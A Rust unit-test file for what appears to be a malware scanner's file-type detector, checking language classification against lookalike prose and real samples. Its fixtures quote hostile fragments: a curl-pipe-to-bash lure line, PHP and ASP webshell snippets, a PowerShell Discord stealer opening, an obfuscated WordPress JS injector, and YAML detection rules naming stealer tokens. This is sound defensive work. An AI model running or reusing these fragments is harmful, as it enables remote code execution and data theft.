use super::*;

fn fat12_boot_sector() -> [u8; 512] {
    let mut data = [0u8; 512];
    data[..3].copy_from_slice(&[0xEB, 0x3C, 0x90]);
    data[3..11].copy_from_slice(b"MSDOS5.0");
    data[11..13].copy_from_slice(&512u16.to_le_bytes());
    data[13] = 1;
    data[14..16].copy_from_slice(&1u16.to_le_bytes());
    data[16] = 2;
    data[17..19].copy_from_slice(&224u16.to_le_bytes());
    data[19..21].copy_from_slice(&2880u16.to_le_bytes());
    data[21] = 0xF0;
    data[22..24].copy_from_slice(&9u16.to_le_bytes());
    data[24..26].copy_from_slice(&18u16.to_le_bytes());
    data[26..28].copy_from_slice(&2u16.to_le_bytes());
    data[510..].copy_from_slice(&[0x55, 0xAA]);
    data
}

fn fat32_boot_sector() -> [u8; 512] {
    let mut data = [0u8; 512];
    data[..3].copy_from_slice(&[0xEB, 0x58, 0x90]);
    data[3..11].copy_from_slice(b"MSWIN4.1");
    data[11..13].copy_from_slice(&512u16.to_le_bytes());
    data[13] = 8;
    data[14..16].copy_from_slice(&32u16.to_le_bytes());
    data[16] = 2;
    data[21] = 0xF8;
    data[24..26].copy_from_slice(&63u16.to_le_bytes());
    data[26..28].copy_from_slice(&255u16.to_le_bytes());
    data[32..36].copy_from_slice(&1_000_000u32.to_le_bytes());
    data[36..40].copy_from_slice(&976u32.to_le_bytes());
    data[510..].copy_from_slice(&[0x55, 0xAA]);
    data
}

#[test]
fn padded_dos_com_overwriter_is_recognized_without_loose_interrupt_matches() {
    const ANTON: &[u8] = include_bytes!("../../../testdata/dos-com/anton-97");
    assert!(looks_like_dos_com_overwriter(ANTON));

    let mut one_interrupt = vec![0u8; 5120];
    one_interrupt[0..6].copy_from_slice(b"*.COM\0");
    one_interrupt[16..18].copy_from_slice(&[0xCD, 0x21]);
    one_interrupt[32..34].copy_from_slice(&[0xCD, 0x20]);
    assert!(!looks_like_dos_com_overwriter(&one_interrupt));

    let mut no_wildcard = one_interrupt.clone();
    no_wildcard[24..26].copy_from_slice(&[0xCD, 0x21]);
    no_wildcard[0..6].copy_from_slice(b"plain\0");
    assert!(!looks_like_dos_com_overwriter(&no_wildcard));

    let text = b"uses INT 21 and INT 20 while searching *.COM\n";
    assert!(!looks_like_dos_com_overwriter(text));
}

#[test]
fn fat_boot_sector_accepts_valid_fat12_and_fat32_bpbs() {
    let sector = fat12_boot_sector();
    assert!(looks_like_fat_boot_sector(&sector));
    assert!(looks_like_fat_boot_sector(&fat32_boot_sector()));
}

#[test]
fn fat_boot_sector_rejects_each_required_bpb_field_when_invalid() {
    let sector = fat12_boot_sector();
    let mut mutations: Vec<(&str, Box<dyn Fn(&mut [u8; 512])>)> = vec![
        (
            "bytes per sector",
            Box::new(|b| b[11..13].copy_from_slice(&513u16.to_le_bytes())),
        ),
        ("cluster size", Box::new(|b| b[13] = 3)),
        ("reserved sectors", Box::new(|b| b[14..16].fill(0))),
        ("fat count", Box::new(|b| b[16] = 0)),
        ("media descriptor", Box::new(|b| b[21] = 0)),
        (
            "fat size",
            Box::new(|b| {
                b[22..24].fill(0);
                b[36..40].fill(0);
            }),
        ),
        (
            "volume size",
            Box::new(|b| {
                b[19..21].fill(0);
                b[32..36].fill(0);
            }),
        ),
        ("sectors per track", Box::new(|b| b[24..26].fill(0))),
        ("head count", Box::new(|b| b[26..28].fill(0))),
        ("jump opcode", Box::new(|b| b[0] = 0x90)),
        ("short jump NOP", Box::new(|b| b[2] = 0x91)),
        ("boot signature", Box::new(|b| b[511] = 0)),
    ];
    for (name, mutate) in mutations.drain(..) {
        let mut invalid = sector;
        mutate(&mut invalid);
        assert!(
            !looks_like_fat_boot_sector(&invalid),
            "accepted invalid {name}"
        );
    }

    let mut signature_only = [0x41u8; 512];
    signature_only[510..].copy_from_slice(&[0x55, 0xAA]);
    assert!(!looks_like_fat_boot_sector(&signature_only));
    assert!(!looks_like_fat_boot_sector(&sector[..511]));
}

#[test]
fn prose_with_keywords_is_not_source() {
    // Sentences that happen to contain JavaScript's scored tokens.
    let para = "Let us go, said Tom, for the new day was const and true. \
                    We shall let it be. And var the river ran, this. is what \
                    the window. of the cabin showed us, and const it stayed.\n";
    let data = para.repeat(40);
    assert!(data.len() >= PROSE_GUARD_MIN_BYTES);
    assert!(looks_like_prose(data.as_bytes()));
    assert_eq!(detect_from_content(data.as_bytes()), None);
}

#[test]
fn source_with_prose_comments_still_detects() {
    let js = "// A long explanatory comment that reads like prose and goes on.\n\
                  const x = require('fs');\nmodule.exports = function (a, b) {\n\
                  \treturn a === b;\n};\nconsole.log(x);\n";
    let data = js.repeat(20);
    assert!(!looks_like_prose(data.as_bytes()));
    assert_eq!(
        detect_from_content(data.as_bytes()),
        Some(FileType::JavaScript)
    );
}

/// Both automata are built from static patterns, and a failure to build
/// either must not pass as "no language here".
#[test]
fn pattern_automata_build() {
    assert_eq!(SCANNER.ac.patterns_len(), PATTERNS.len());
    assert_eq!(SCANNER.entries.len(), PATTERNS.len());
    assert!(HTML_AC.is_match(b"<HTML>"));
}

/// A score index, its place in `LANGS` and its file type agree.
#[test]
fn languages_round_trip_through_file_types() {
    for (i, &lang) in LANGS.iter().enumerate() {
        assert_eq!(lang.idx(), i, "{lang:?}");
        assert_eq!(Lang::from_file_type(lang.to_file_type()), Some(lang));
    }
    assert_eq!(Lang::from_file_type(FileType::Go), None);
}

/// Two languages both past 655 points used to overflow `u16` when their
/// ratio was taken, which panics in a debug build. They are simply too
/// close to call.
#[test]
fn saturated_scores_are_compared_without_overflow() {
    let data = b"self.;cd /;".repeat(SCAN_LIMIT / 11);
    let scores = scan_scores(&data);
    assert!(scores[Lang::Python.idx()] > 655 && scores[Lang::Shell.idx()] > 655);
    assert_eq!(detect_from_content(&data), None);
}

#[test]
fn binary_judgement_reads_past_a_utf8_bom() {
    let mut data = b"\xEF\xBB\xBF".to_vec();
    data.extend_from_slice(b"\x01\x02\x03\x04\x05\x06\x07\x08 mostly text\n");
    assert!(binary_not_source(&data));
    assert!(!binary_not_source(
        b"\xEF\xBB\xBF#import <Foundation/Foundation.h>\n"
    ));
}

#[test]
fn prose_guard_skips_tiny_inputs() {
    let tiny = b"var x = require('foo');\nmodule.exports = x;\n";
    assert!(tiny.len() < PROSE_GUARD_MIN_BYTES);
    assert_eq!(detect_from_content(tiny), Some(FileType::JavaScript));
}

/// The bitmask is exactly [`CODE_PUNCT`], over every byte value.
#[test]
fn code_punct_mask_matches_list() {
    for b in 0..=u8::MAX {
        assert_eq!(is_code_punct(b), CODE_PUNCT.contains(&b), "byte {b:#04x}");
    }
}

#[test]
fn shell_heuristic() {
    let data = b"export PATH=/usr/bin\nif [ -f /etc/foo ]; then\n  echo ok\nfi\n";
    assert_eq!(detect_from_content(data), Some(FileType::Shell));
}

/// Line-anchored tokens must score under CRLF endings too.
#[test]
fn crlf_line_tokens() {
    let sh = b"if [ -f /etc/foo ]; then\r\n  echo ok\r\nfi\r\n";
    assert_eq!(detect_from_content(sh), Some(FileType::Shell));
    let pl = b"use strict\r\n;\r\nprint 1;\r\n";
    assert_eq!(detect_from_content(pl), Some(FileType::Perl));
}

#[test]
fn python_heuristic() {
    let data = b"import os\nimport sys\ndef main():\n    print('hello')\n";
    assert_eq!(detect_from_content(data), Some(FileType::Python));
}

#[test]
fn python_name_main() {
    let data = b"if __name__ == '__main__':\n    main()\n";
    assert_eq!(detect_from_content(data), Some(FileType::Python));
}

#[test]
fn powershell_heuristic() {
    let data = b"$ErrorActionPreference = 'Stop'\nWrite-Host 'hello'\nGet-Process | Set-Variable\n";
    assert_eq!(detect_from_content(data), Some(FileType::PowerShell));
}

// A Discord clipboard stealer from the gauntlet, cut to its opening. It
// carries no `$ErrorActionPreference`/`Write-Host`, only the advanced
// function and `Add-Type` idioms.
#[test]
fn powershell_advanced_function_and_add_type() {
    let data = b"Add-Type -AssemblyName WindowsBase\r\n\
            Add-Type -AssemblyName PresentationCore\r\n\r\n\
            function dischat {\r\n  [CmdletBinding()]\r\n  param (\r\n\
            [Parameter (Position=0,Mandatory = $True)]\r\n  [string]$con\r\n  )\r\n\
            $Body = @{ 'username' = $env:username; 'content' = $con }\r\n\
            Invoke-RestMethod -Uri $hookUrl -Method 'post' -Body $Body\r\n}\r\n";
    assert_eq!(detect_from_content(data), Some(FileType::PowerShell));
}

#[test]
fn powershell_cmdletbinding_alone() {
    let data =
        b"function Get-Thing {\n    [CmdletBinding()]\n    param([string]$Name)\n    $Name\n}\n";
    assert_eq!(detect_from_content(data), Some(FileType::PowerShell));
}

#[test]
fn powershell_add_type_alone() {
    let data = b"Add-Type -AssemblyName System.Windows.Forms\n[System.Windows.Forms.Clipboard]::GetText()\n";
    assert_eq!(detect_from_content(data), Some(FileType::PowerShell));
}

// `$env:` is only strong evidence: one mention in a line of text is not a
// PowerShell script.
#[test]
fn powershell_env_drive_alone_is_not_enough() {
    let data = b"Set the value through $env:PATH before you start the tool.\n";
    assert_ne!(detect_from_content(data), Some(FileType::PowerShell));
}

// A batch file that shells out to PowerShell mentions `$env:` inside the
// `-Command` string; the line grammar still decides it is batch.
#[test]
fn batch_quoting_powershell_env_stays_batch() {
    let data = b"@echo off\r\nsetlocal\r\npowershell -NoProfile -Command \"Write-Output $env:TEMP\"\r\nset X=%TEMP%\r\n";
    assert_eq!(detect_from_content(data), Some(FileType::Batch));
}

// A C# cmdlet declares `[Cmdlet(...)]`, never `[CmdletBinding(`.
#[test]
fn csharp_cmdlet_is_not_powershell() {
    let data = b"using System.Management.Automation;\n\
            [Cmdlet(VerbsCommon.Get, \"Thing\")]\n\
            public class GetThing : PSCmdlet {\n    protected override void ProcessRecord() { }\n}\n";
    assert_ne!(detect_from_content(data), Some(FileType::PowerShell));
}

#[test]
fn perl_use_strict() {
    let data = b"use strict;\nuse warnings;\nmy $x = 1;\n";
    assert_eq!(detect_from_content(data), Some(FileType::Perl));
}

#[test]
fn batch_echo() {
    let data = b"@echo off\nSETLOCAL\nset PATH=%PATH%;C:\\bin\n";
    assert_eq!(detect_from_content(data), Some(FileType::Batch));
}

#[test]
fn vbs_wscript() {
    let data = b"Dim x\nSet obj = CreateObject(\"Scripting.FileSystemObject\")\nWScript.Echo x\n";
    assert_eq!(detect_from_content(data), Some(FileType::Vbs));
}

#[test]
fn lua_setmetatable() {
    let data = b"local t = {}\nsetmetatable(t, {__index = function() end})\n";
    assert_eq!(detect_from_content(data), Some(FileType::Lua));
}

#[test]
fn minified_obfuscated_lua() {
    // Prometheus-style output: one line, no environment calls in the head.
    let data = br#"return(function(...)local J=function(E)local H,v=E[#E],""for J=1,#H,1 do v=v..H[E[J]]end return v end local E={J({1;3,2,{"\110","\108"}})}end)(...)"#;
    assert_eq!(detect_from_content(data), Some(FileType::Lua));
    let data = b"local function f(a) return a end\nlocal function g(b) return f(b) end\n";
    assert_eq!(detect_from_content(data), Some(FileType::Lua));
}

#[test]
fn javascript_rest_parameters_are_not_lua() {
    let data = b"const f = function(...args) { return args.length; };\nmodule.exports = f;\n";
    assert_eq!(detect_from_content(data), Some(FileType::JavaScript));
}

#[test]
fn php_html_fragment_not_lua() {
    let data = br#"/**
** Filters for Special Mail Tags
**/

add_filter( 'wpcf7_special_mail_tags', 'wpcf7_special_mail_tag', 10, 3 );

function wpcf7_special_mail_tag( $output, $name, $html ) {
    if ( '_remote_ip' == $name )
        $output = preg_replace( '/[^0-9a-f.:, ]/', '', $_SERVER['REMOTE_ADDR'] );
    elseif ( '_user_agent' == $name )
        $output = substr( $_SERVER['HTTP_USER_AGENT'], 0, 254 );
}
?>
<!DOCTYPE html><html><head><script>var x = 1;</script></head></html>
"#;
    assert_eq!(detect_from_content(data), Some(FileType::Php));
}

#[test]
fn detection_rules_quoting_php_superglobals_are_not_php() {
    // A YAML rule file whose regexes match PHP stagers: it names `$_POST`
    // and `$_COOKIE` but contains no PHP tag, so it is not PHP.
    let data = br#"defaults:
  platforms: [linux, unix]
  for: [data]

traits:
  - id: webshell-post-loop
    desc: foreach over POST parameters
    if:
      type: raw
      regex: foreach\s*\(\s*\$_POST\s+as.{0,80}==\s*16

  - id: webshell-cookie-post-pair
    if:
      type: raw
      regex: \$_COOKIE\s*,\s*\$_POST
"#;
    assert_eq!(detect_from_content(data), None);
}

#[test]
fn php_requires_a_tag() {
    // Same superglobals, no tag — prose about PHP is not PHP.
    let untagged = b"The handler reads $_POST and $_GET, then calls preg_replace( ) on it.\n";
    assert_eq!(detect_from_content(untagged), None);

    // The opening tag settles it.
    let tagged = b"<?php\n$x = $_POST['a'];\necho $x;\n";
    assert_eq!(detect_from_content(tagged), Some(FileType::Php));
}

#[test]
fn php4_var_properties_are_php_not_javascript() {
    // `var $name` is a PHP 4 property. Scoring it as JavaScript `var `
    // tied the two languages and left the file unidentified.
    let data = b"<?\nclass backdoor {\n  var $pwd;\n  var $shell;\n  function shell() {\n    system($this->shell);\n    echo $_SERVER['PHP_SELF'];\n  }\n}\n";
    assert_eq!(detect_from_content(data), Some(FileType::Php));
}

#[test]
fn short_tag_stripslashes_webshell_is_php() {
    let data = b"<?\n$cmd = stripslashes($cmd);\nsystem($cmd);\n";
    assert_eq!(detect_from_content(data), Some(FileType::Php));
}

#[test]
fn itself_and_except_prose_is_not_python() {
    let data = b"Modified Version, except to acknowledge the contribution.\n\
Original or Modified Versions may be sold by itself.\n";
    assert_eq!(detect_from_content(data), None);
}

#[test]
fn let_the_and_applet_prose_is_not_javascript() {
    let data = b"If you discover a problem, post a message and let the rest of us know.\n\
Coordinate with the Applet Maintainer before sweeping changes.\n";
    assert_eq!(detect_from_content(data), None);
}

#[test]
fn python_self_attribute_and_except_still_detected() {
    let data = b"try:\n    self.foo()\nexcept Exception:\n    pass\n";
    assert_eq!(detect_from_content(data), Some(FileType::Python));
}

#[test]
fn javascript_let_binding_still_detected() {
    let data = b"function main() {\n  let count = 1;\n  let total = count;\n  return total;\n}\n";
    assert_eq!(detect_from_content(data), Some(FileType::JavaScript));
}

#[test]
fn eval_call_is_not_kotlin_val() {
    let data = b"<%\nre = request(\"sb\")\neval(request(0))\nexecute re\n%>\n";
    assert_ne!(detect_from_content(data), Some(FileType::Kotlin));
}

#[test]
fn kotlin_val_bindings_still_detected() {
    let data = b"fun main() {\n  val count = 1\n  val total = count\n}\n";
    assert_eq!(detect_from_content(data), Some(FileType::Kotlin));
}

#[test]
fn php_just_past_the_first_window_is_still_php() {
    let mut data = Vec::new();
    for _ in 0..600 {
        data.extend_from_slice(b"/* x */\n");
    }
    data.extend_from_slice(b"<?php\n$x = $_POST['a'];\neval($x);\n");
    assert!(data.len() > SCAN_LIMIT);
    assert_eq!(detect_from_content(&data), Some(FileType::Php));
}

#[test]
fn xml_processing_instruction_is_not_a_php_tag() {
    let data = br#"<?xml version="1.0"?>
<rules>
  <rule match="$_POST"/>
  <rule match="$_GET"/>
  <rule match="$_SERVER"/>
</rules>
"#;
    assert_eq!(detect_from_content(data), None);
}

#[test]
fn yaml_detection_rules_are_not_typed_as_what_they_match() {
    // Detection content names the tokens it hunts for. Each of these rule
    // files quotes a different language's conclusive markers; none of them
    // is that language. The `.yaml` extension normally suppresses content
    // heuristics, but a renamed, disabled, or extensionless copy reaches
    // them, so the document shape has to carry the decision.
    let python = br#"traits:
  - id: py-stager-entrypoint
    desc: Python stager entrypoint
    if:
      type: raw
      substr: if __name__
  - id: py-stager-imports
    if:
      type: raw
      substr: import os
  - id: py-stager-decode
    if:
      type: raw
      substr: base64.b64decode
"#;
    assert_eq!(detect_from_content(python), None);

    let applescript = br#"traits:
  - id: amos-shell-handoff
    desc: AMOS stealer shell handoff
    if:
      type: raw
      substr: do shell script
  - id: amos-tell-finder
    if:
      type: raw
      substr: tell application "Finder"
  - id: amos-quoted-form
    if:
      type: raw
      substr: quoted form of
"#;
    assert_eq!(detect_from_content(applescript), None);

    let powershell = br#"traits:
  - id: ps-loader-preference
    if:
      type: raw
      substr: $ErrorActionPreference
  - id: ps-loader-convert
    if:
      type: raw
      substr: "[System.Convert]"
  - id: ps-loader-xor
    if:
      type: raw
      substr: " -bxor "
"#;
    assert_eq!(detect_from_content(powershell), None);

    let vbs = br#"traits:
  - id: vbs-dropper-host
    if:
      type: raw
      substr: WScript.Shell
  - id: vbs-dropper-explicit
    if:
      type: raw
      substr: Option Explicit
  - id: vbs-dropper-createobject
    if:
      type: raw
      substr: CreateObject(
"#;
    assert_eq!(detect_from_content(vbs), None);
}

#[test]
fn json_manifest_quoting_language_tokens_is_not_that_language() {
    let data = br##"{
  "name": "rule-pack",
  "rules": [
    {"id": "py", "match": "import os"},
    {"id": "ps", "match": "$ErrorActionPreference"},
    {"id": "lua", "match": "setmetatable"},
    {"id": "c", "match": "#include <stdio.h>"}
  ]
}
"##;
    assert_eq!(detect_from_content(data), None);
}

#[test]
fn sql_query_is_not_a_dockerfile() {
    // `\nFROM ` is the Dockerfile marker, but uppercase SQL puts FROM at the
    // start of a line too. A Dockerfile must begin with FROM (or ARG); this
    // begins with SELECT.
    let data = br#"SELECT id, name, created_at
FROM users
WHERE created_at > now() - interval '7 days'
ORDER BY created_at DESC;
"#;
    assert_ne!(detect_from_content(data), Some(FileType::Dockerfile));

    // A real Dockerfile still resolves.
    let dockerfile = br#"# syntax=docker/dockerfile:1
FROM alpine:3.20
RUN apk add --no-cache curl
COPY entrypoint.sh /entrypoint.sh
"#;
    assert_eq!(detect_from_content(dockerfile), Some(FileType::Dockerfile));
}

#[test]
fn javascript_module_exports() {
    let data = b"var x = require('foo');\nmodule.exports = x;\n";
    assert_eq!(detect_from_content(data), Some(FileType::JavaScript));
}

#[test]
fn javascript_iife_console() {
    let data = b"(function() { var x = 1; console.log(x); })();\n";
    assert_eq!(detect_from_content(data), Some(FileType::JavaScript));
}

#[test]
fn license_prose_not_javascript() {
    // GPL/LGPL prose hits JS keyword tokens — "this document." (document.),
    // and "tablet"/"outlet"/"let you" (let ) — but has no JS structure
    // (`;`/`{`/`}`). It must not classify as JavaScript on keywords alone.
    let data = b"You may copy and distribute verbatim copies of this document. \
A tablet or outlet may let you study the freedom this license grants. \
Everyone is permitted to copy this document. then let recipients know their rights.";
    assert_ne!(detect_from_content(data), Some(FileType::JavaScript));
}

#[test]
fn javascript_dom_with_structure_still_detected() {
    // Real DOM JS: document.<member>/window.<member> plus a statement
    // terminator — structure present, so it detects.
    let data = b"const el = document.getElementById('x');\nwindow.location = el;\n";
    assert_eq!(detect_from_content(data), Some(FileType::JavaScript));
}

#[test]
fn applescript_stealer_handlers() {
    // AMOS/Shub-family plaintext AppleScript stealer delivered with a
    // `.unknown` extension: handler blocks plus `do shell script` and
    // `quoted form of POSIX path` must classify as AppleScript, not unknown.
    let data = b"on filesizer(paths)\n\
\tset fsz to 0\n\
\ttry\n\
\t\tset theItem to quoted form of POSIX path of paths\n\
\t\tset fsz to (do shell script \"/usr/bin/mdls -name kMDItemFSSize -raw \" & theItem)\n\
\tend try\n\
\treturn fsz\n\
end filesizer\n";
    assert_eq!(detect_from_content(data), Some(FileType::AppleScript));
}

#[test]
fn applescript_tell_block() {
    let data = b"tell application \"Finder\"\n\
\tset x to name of every file\n\
end tell\n";
    assert_eq!(detect_from_content(data), Some(FileType::AppleScript));
}

#[test]
fn pacman_install_scriptlet() {
    // AUR `.install` scriptlet (the AUR/ALVR supply-chain delivery vector):
    // the pacman hook-function definitions must classify as Shell even with
    // an unmapped `.install` extension so install-hook composites can fire.
    let data = b"post_install() {\n  cd /tmp\n  npm install atomic-lockfile yargs\n}\n";
    assert_eq!(detect_from_content(data), Some(FileType::Shell));
}

#[test]
fn nohup_curl_pipe_bash_is_shell() {
    // Disk-image lures named `Drag into Terminal.xyz` are a one-line
    // shell with no shebang and a non-shell extension.
    let data = b"nohup curl -s https://example.pages.dev/payload.aspx | bash\n";
    assert_eq!(detect_from_content(data), Some(FileType::Shell));
}

#[test]
fn debian_dh_install_is_not_shell() {
    // Debian `debian/*.install` files share the extension but are plain
    // path lists with no scriptlet functions — they must NOT become Shell.
    let data = b"usr/bin/foo\nusr/share/foo/bar.png\netc/foo/foo.conf\n";
    assert_eq!(detect_from_content(data), None);
}

#[test]
fn c_include() {
    let data = b"#include <stdio.h>\nint main() { return 0; }\n";
    assert_eq!(detect_from_content(data), Some(FileType::C));
}

#[test]
fn html_detection() {
    assert!(looks_like_html(
        b"<!DOCTYPE html><html><body>hi</body></html>"
    ));
    assert!(looks_like_html(
        b"<html><head><title>x</title></head></html>"
    ));
    assert!(!looks_like_html(b"just some plain text here"));
}

#[test]
fn empty_data() {
    assert_eq!(detect_from_content(b""), None);
}

#[test]
fn random_binary() {
    let data: Vec<u8> = (0..=255).collect();
    assert_eq!(detect_from_content(&data), None);
}

#[test]
fn whitespace_padded_python() {
    let mut data = vec![b' '; 5000];
    data.extend_from_slice(b"import os\nimport sys\ndef main():\n    print('hello')\n");
    assert_eq!(detect_from_content(&data), Some(FileType::Python));
}

#[test]
fn whitespace_padded_javascript() {
    let mut data = vec![b'\n'; 5000];
    data.extend_from_slice(b"(function() { var x = 1; console.log(x); module.exports = x; })();\n");
    assert_eq!(detect_from_content(&data), Some(FileType::JavaScript));
}

#[test]
fn kotlin_heuristic() {
    let data = b"
package com.airbnb.lottie.baselineprofile

import androidx.benchmark.macro.junit4.BaselineProfileRule
import androidx.test.ext.junit.runners.AndroidJUnit4
import androidx.test.filters.LargeTest
import org.junit.Rule
import org.junit.Test
import org.junit.runner.RunWith

/**
 * You can run the generator with the Generate Baseline Profile gradle task.
 * ```
 * ./gradlew :lottie(-compose):generateReleaseBaselineProfile -Pandroid.testInstrumentationRunnerArguments.androidx.benchmark.enabledRules=BaselineProfile
 * ```
 *
 * After you run the generator, you can verify the improvements running the [StartupBenchmarks] benchmark.
 **/
@RunWith(AndroidJUnit4::class)
@LargeTest
class BaselineProfileGenerator {

    @get:Rule
    val rule = BaselineProfileRule()

    @Test
    fun generate() {
        rule.collect(\"com.airbnb.lottie.benchmark.app\") {
            pressHome()
            startActivityAndWait()
        }
    }
}
";
    assert_eq!(detect_from_content(data), Some(FileType::Kotlin));
}

#[test]
fn prose_with_package_word_is_not_kotlin() {
    // Texinfo/prose that line-wraps to "package for creating scripts"
    // (GNU Autoconf manual) must not be mistaken for Kotlin via a bare
    // `package ` substring. With no second Kotlin token it stays below
    // threshold.
    let data = b"This is ./autoconf.info, produced by makeinfo version 4.8 from\n\
./autoconf.texi.  This manual is for GNU Autoconf, a\n\
package for creating scripts to configure source code packages.\n";
    assert_eq!(detect_from_content(data), None);
}

#[test]
fn apt_translation_catalogue_is_not_kotlin() {
    // /var/lib/apt/lists/*_i18n_Translation-en: deb822 stanzas whose folded
    // continuations are English package descriptions. Six occurrences of
    // "package " in the first 4 KB scored Kotlin 30 against a threshold of
    // 10, so 32 MB of prose was parsed as Kotlin and the JVM credential
    // rules fired on it (`id_rsa`, /etc/shadow and crontab lines all appear
    // in the descriptions of openssh-client, passwd and cron).
    let data = b"Package: 0ad-data\n\
Description-md5: 26581e685027d5ae84824362a4ba59ee\n\
Description-en: Real-time strategy game of ancient warfare (data files)\n\
\x20 0 A.D. is a free, open-source, cross-platform real-time strategy game.\n\
\x20.\n\
\x20This package contains the main data files required by 0 A.D.\n\
\n\
Package: openssh-client\n\
Description-md5: 9d1b1b0e8e2b0e4e0e6a9e4f9c6b5a3d\n\
Description-en: secure shell (SSH) client\n\
\x20This package provides the ssh client and reads ~/.ssh/id_rsa.\n";
    assert_eq!(detect_from_content(data), None);
}

#[test]
fn kotlin_package_declaration_is_not_a_deb822_field() {
    // The stanza check must not swallow real Kotlin: `package a.b` has no
    // colon, so the file's first significant line is not a field line.
    let data = b"package com.example.app\n\
\n\
import kotlin.io.println\n\
\n\
suspend fun main() {\n\
    val greeting = \"hi\"\n\
    println(greeting)\n\
}\n";
    assert_eq!(detect_from_content(data), Some(FileType::Kotlin));
}

#[test]
fn var_heavy_obfuscated_js_is_not_kotlin() {
    // Trojanized WordPress JS (VirusShare sample): a jQuery script with an
    // appended obfuscated injector whose renamed locals use `var` ~14×.
    // `var ` is a JS keyword, not a Kotlin signal — the JS markers
    // (`(function(`, `===`, `window.`) must win, not lose to Kotlin's `var`.
    let data = b"jQuery(function( $ ){ $('.x').click(function(){}); });\n\
if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){\
var P=y[O];return P;};}var ndsw=true,HttpClient=function(){var S=g;};\
var rand=function(){var C=g;};(function(){var Y=g,R=navigator;\
var D=new HttpClient();window['eval'](R);}());}\n";
    assert_eq!(detect_from_content(data), Some(FileType::JavaScript));
}
